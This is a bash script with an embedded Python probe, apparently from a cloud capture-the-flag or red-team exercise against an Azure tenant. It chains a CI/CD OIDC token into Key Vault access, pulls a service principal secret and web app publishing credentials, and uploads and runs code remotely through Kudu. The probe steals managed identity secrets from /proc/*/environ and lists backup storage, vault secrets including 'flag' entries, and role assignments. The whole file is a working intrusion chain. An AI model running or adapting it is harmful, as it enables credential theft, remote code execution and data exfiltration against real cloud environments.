#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
CICD_ID=72ff278a-9e71-43ec-bac4-2ca303f8e462

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')

VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$CICD_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

RS_JSON=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" \
  -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
RS_CID=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("appId",""))')
RS_SEC=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("clientSecret",""))')

RS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$RS_CID" -d "grant_type=client_credentials" \
  --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

APP=app-tbl-reporting-prod
RG_R=rg-tbl-reporting-prod-eus
PUB=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_R/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_ARM" -H "Content-Type: application/json" -d '{}')
KU=$(echo "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingUserName"])')
KP=$(echo "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingPassword"])')
echo "KUDU=$KU"
SCM="https://$APP.scm.azurewebsites.net"

# Probe script that reads app process environ to get real IDENTITY_ENDPOINT
cat > /tmp/probe2.py << 'PYEOF'
import os,json,urllib.request,urllib.error,datetime,subprocess,re

# Find gunicorn/app process and read its environ
result = {"proc_envs_tried": []}
IE = ""; IH = ""

# Try to find app process PIDs
try:
    ps_out = subprocess.check_output(["ps", "aux"], timeout=5).decode()
    pids = []
    for line in ps_out.split('\n'):
        if 'gunicorn' in line or 'python' in line or 'uwsgi' in line:
            parts = line.split()
            if len(parts) > 1:
                try: pids.append(int(parts[1]))
                except: pass
    result["pids"] = pids
except Exception as e:
    result["ps_err"] = str(e)
    # Fallback: scan /proc
    try:
        pids = [int(p) for p in os.listdir('/proc') if p.isdigit()]
    except: pids = []

# Read environ from each pid
for pid in (pids if pids else [int(p) for p in os.listdir('/proc') if p.isdigit()]):
    try:
        env_raw = open(f'/proc/{pid}/environ','rb').read()
        env_dict = dict(e.split(b'=', 1) for e in env_raw.split(b'\x00') if b'=' in e)
        if b'IDENTITY_ENDPOINT' in env_dict:
            IE = env_dict[b'IDENTITY_ENDPOINT'].decode()
            IH = env_dict.get(b'IDENTITY_HEADER', b'').decode()
            result["found_pid"] = pid
            result["ie"] = IE
            result["ih_len"] = len(IH)
            result["proc_env_keys"] = [k.decode() for k in env_dict.keys()]
            break
        result["proc_envs_tried"].append(pid)
    except: pass

# Try MSI_ENDPOINT as fallback
if not IE:
    for pid in ([result.get("found_pid")] if result.get("found_pid") else [int(p) for p in os.listdir('/proc') if p.isdigit()]):
        try:
            env_raw = open(f'/proc/{pid}/environ','rb').read()
            env_dict = dict(e.split(b'=', 1) for e in env_raw.split(b'\x00') if b'=' in e)
            if b'MSI_ENDPOINT' in env_dict:
                IE = env_dict[b'MSI_ENDPOINT'].decode()
                IH = env_dict.get(b'MSI_SECRET', b'').decode()
                result["msi_endpoint"] = IE
                result["msi_secret_len"] = len(IH)
                break
        except: pass

result["final_ie"] = IE[:80]
result["final_ih_len"] = len(IH)

CID = "7a85156a-01c4-4e61-8472-40a92107159b"

def tok(res):
    if not IE: return "NO_IE"
    try:
        url = IE + "?resource=" + res + "&api-version=2019-08-01&client_id=" + CID
        return json.load(urllib.request.urlopen(urllib.request.Request(url, headers={"X-IDENTITY-HEADER": IH}), timeout=8))["access_token"]
    except Exception as e: return "ERR:" + str(e)[:100]

def hget(url, t):
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
    h = {"Authorization": "Bearer " + t, "x-ms-version": "2021-08-06", "x-ms-date": ts}
    try: return urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=10).read().decode()[:4000]
    except urllib.error.HTTPError as e: return f"HTTP{e.code}:" + e.read().decode()[:300]
    except Exception as e: return "ERR:" + str(e)[:200]

st = tok("https://storage.azure.com/")
vt = tok("https://vault.azure.net/")
at = tok("https://management.azure.com/")
result["st_len"] = len(st)
result["vt_len"] = len(vt)
result["at_len"] = len(at)

if len(st) > 100:
    result["backup_exports"] = hget("https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list", st)
    result["appcfg_blobs"] = hget("https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list", st)
    result["archive_blobs"] = hget("https://sttblarchiveprodx3euoz.blob.core.windows.net/?comp=list", st)

if len(vt) > 100:
    result["kv_sec_list"] = hget("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4", vt)
    result["kv_sec_flag"] = hget("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", vt)
    result["kv_prod_flag"] = hget("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", vt)

if len(at) > 100:
    result["kv_sec_arm"] = hget("https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01", at)
    result["role_assignments"] = hget("https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'f64d08c7-fde6-4553-99c8-5bf73666ee8c'", at)
    result["backup_roles"] = hget("https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", at)

print(json.dumps(result, indent=2))
PYEOF

curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/probe2.py" \
  -H "Content-Type: text/plain" --data-binary @/tmp/probe2.py --max-time 30 -o /dev/null -w "VFS=%{http_code}\n"

echo "PROBE2_OUTPUT:"
curl -s -u "$KU:$KP" -X POST "$SCM/api/command" \
  -H "Content-Type: application/json" --max-time 120 \
  -d '{"command":"python3 /home/site/wwwroot/probe2.py","dir":"/"}'
echo ""
echo "DONE"
